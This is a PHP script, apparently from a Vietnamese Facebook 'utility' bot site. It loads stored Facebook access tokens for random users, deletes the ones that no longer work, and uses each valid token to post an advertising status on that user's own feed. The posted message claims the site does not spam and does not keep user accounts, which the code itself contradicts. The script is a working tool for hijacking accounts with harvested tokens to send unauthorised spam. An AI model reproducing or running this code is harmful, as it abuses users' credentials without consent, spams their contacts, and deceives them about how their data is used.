<?php
set_time_limit(0);
require("../databasecsdl.php");
$getinfo = @mysqli_query($connection,"SELECT * FROM `Users` ORDER BY RAND() LIMIT 0,10");
$star = 0;
while ($gettoken = @mysqli_fetch_array($getinfo)){
$token= $gettoken['token2'];
$name= $gettoken['name'];

$check = json_decode(file_get_contents('https://graph.facebook.com/me?access_token='.$token),true);
if(!$check[id]){
@mysqli_query($connection,"DELETE FROM Users
            WHERE
               token2 ='".$token."'
         ");
continue;
}
$msg = '#BótVn - Website tiện ích Facebook hàng đầu Việt Nam.
Chúng tôi đảm bảo không spam, không lưu lại tài khoản của bạn.
Chúng tôi tự hào về chất lượng sẽ đem lại cho bạn.
Admin Bót•Vn - BMN2312 - Cảm ơn '.$name.' đã tin tưởng.
💞=========🌷🌷=========💞 
Chào bạn: '.$name.'.
Cảm ơn bạn đã sử dụng Website của mình.
Mạn phép cho mình xin 1 status quảng cáo nhé.
🚹=========🚺🚺=========🚹';
auto('https://graph.facebook.com/me/feed?access_token='.$token.'&message='.urlencode($msg).'&method=post');
}

function auto($url) {
   $ch = curl_init();
   curl_setopt_array($ch, array(
      CURLOPT_CONNECTTIMEOUT => 5,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_URL            => $url,
      )
   );
   $result = curl_exec($ch);
   curl_close($ch);
   return $result;
}
?>